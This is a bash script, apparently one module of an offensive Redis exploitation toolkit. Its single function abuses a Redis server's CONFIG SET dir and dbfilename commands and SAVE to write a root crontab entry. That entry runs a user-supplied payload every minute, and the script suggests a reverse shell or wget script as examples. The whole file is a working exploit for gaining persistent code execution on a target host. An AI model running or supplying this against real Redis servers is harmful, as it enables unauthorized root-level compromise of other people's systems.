#!/bin/bash

# Source common functions
source "$(dirname "$0")/common.sh"

# Cron job injection function
function inject_cron_job() {
  echo -e "${BLUE}[*]${NC} Injecting cron job..."
  
  local CRON_DIRS=("/var/spool/cron/crontabs/root" "/var/spool/cron/root" "/etc/crontab")
  
  echo "Enter the cron job payload (e.g., reverse shell, wget script):"
  read -p "Payload: " CRON_PAYLOAD
  
  if [ -z "$CRON_PAYLOAD" ]; then
    echo -e "${RED}[-]${NC} No payload provided."
    return 1
  fi
  
  echo -e "${YELLOW}Trying common cron directories...${NC}"
  
  for CRON_DIR in "${CRON_DIRS[@]}"; do
    echo -e "${BLUE}[*]${NC} Trying: $CRON_DIR"
    
    if redis_cmd CONFIG SET dir "$(dirname "$CRON_DIR")" >/dev/null 2>&1; then
      if redis_cmd CONFIG SET dbfilename "$(basename "$CRON_DIR")" >/dev/null 2>&1; then
        if echo -en "\n\n* * * * * $CRON_PAYLOAD\n\n" | redis_cmd -x SET cronjob >/dev/null 2>&1; then
          if redis_cmd SAVE >/dev/null 2>&1; then
            echo -e "${GREEN}[+]${NC} Cron job injected successfully!"
            echo -e "${GREEN}[+]${NC} Location: $CRON_DIR"
            echo -e "${GREEN}[+]${NC} Payload will execute every minute"
            return 0
          fi
        fi
      fi
    fi
  done
  
  echo -e "${RED}[-]${NC} Failed to inject cron job"
  return 1
}